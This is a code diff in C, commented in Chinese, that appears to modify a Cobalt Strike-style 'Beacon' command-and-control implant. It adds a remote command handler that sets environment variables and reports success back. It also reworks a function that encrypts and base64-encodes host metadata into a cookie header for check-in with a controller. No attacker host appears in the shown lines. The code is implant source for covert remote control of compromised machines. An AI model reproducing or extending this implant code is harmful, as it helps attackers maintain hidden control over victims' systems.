@@ -17,18 +17,49 @@ VOID CmdChangSleepTimes(unsigned char* commandBuf) {
     SleepTime = sleep;
 }
 
-wchar_t* makeMetaData() {
-    EncryMetadataResult EncryMetainfos = EncryMetadata();
-    unsigned char* EncryMetainfo = EncryMetainfos.EncryMetadata;
-    int EncryMetainfolen = EncryMetainfos.EncryMetadataLen;
+// 是对当前进程的环境变量
+unsigned char* CmdSetEnv(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
+    // 返回 0 表示成功
+    if (putenv(commandBuf)) {
+        fprintf(stderr, "putenv failed\n");
+        *msgLen = 0;
+        return NULL;
+    }
+    // DEBUG：
+    fprintf(stdout, "Beacon = %s\n", getenv("Beacon"));
+    unsigned char* envStr = "[+] setenv success: ";
+    unsigned char* postMsg = malloc(strlen(envStr) + commandBuflen + 1);
+    if (!postMsg) {
+        fprintf(stderr, "Memory allocation failed\n");
+        *msgLen = 0;
+        return NULL;
+    }
+    snprintf(postMsg, strlen(envStr) + commandBuflen + 1, "%s%s", envStr, commandBuf);
+    *msgLen = strlen(envStr) + commandBuflen;
+    return postMsg;
+}
 
-    if (!EncryMetainfo || EncryMetainfolen <= 0) {
+
+VOID FreeEncryptMetadataResult(EncryptMetadataResult* r) {
+    if (r && r->EncryptMetaData) {
+        free(r->EncryptMetaData);
+        r->EncryptMetaData = NULL;
+        r->EncryptMetaDataLen = 0;
+    }
+}
+
+wchar_t* makeMetaData() {
+    EncryptMetadataResult EncryptMetaInfos = EncryMetadata();
+    unsigned char* EncryptMetaInfo = EncryptMetaInfos.EncryptMetaData;
+    int EncryptMetaInfolen = EncryptMetaInfos.EncryptMetaDataLen;
+
+    if (!EncryptMetaInfo || EncryptMetaInfolen <= 0) {
         fprintf(stderr, "EncryMetadata failed\n");
         return NULL;
     }
 
-    unsigned char* baseEncodeMetadata = base64Encode(EncryMetainfo, EncryMetainfolen);
-    free(EncryMetainfo);
+    unsigned char* baseEncodeMetadata = base64Encode(EncryptMetaInfo, EncryptMetaInfolen);
+	FreeEncryptMetadataResult(&EncryptMetaInfos);
     if (!baseEncodeMetadata) {
 		fprintf(stderr, "base64Encode failed\n");
         return NULL;
@@ -62,7 +93,7 @@ wchar_t* makeMetaData() {
 	free(headerStart);
 	free(baseEncodeMetadata);
 
-    // 转换为宽字符
+    // 先计算宽字符长度（包含结尾 \0）
     int wideLen = MultiByteToWideChar(CP_ACP, 0, (char*)cookieStr, -1, NULL, 0);
     if (wideLen == 0) {
         fprintf(stderr, "MultiByteToWideChar Failed With Error：%lu\n", GetLastError());
@@ -70,8 +101,8 @@ wchar_t* makeMetaData() {
         return NULL;
     }
 
-    // 多分配 3 wchar_t：\r, \n, \0
-    wchar_t* wCookieStr = (wchar_t*)malloc((wideLen + 3) * sizeof(wchar_t));
+    // 分配 wideLen（字符串 + 末尾\0）+ 2（\r \n）+ 1（新的\0）
+    wchar_t* wCookieStr = (wchar_t*)malloc((wideLen + 2) * sizeof(wchar_t));
     if (!wCookieStr) {
         fprintf(stderr, "Memory allocation failed for wCookieStr\n");
         free(cookieStr);
@@ -85,9 +116,10 @@ wchar_t* makeMetaData() {
         return NULL;
     }
 
-    // 追加 CRLF
-	// 自动在结尾添加 \0
-    wcsncat(wCookieStr, L"\r\n", 2);
+    // 追加 CRLF，覆盖原有的 \0
+    wCookieStr[wideLen - 1] = L'\r';
+    wCookieStr[wideLen] = L'\n';
+    wCookieStr[wideLen + 1] = L'\0';
 
     free(cookieStr);
 
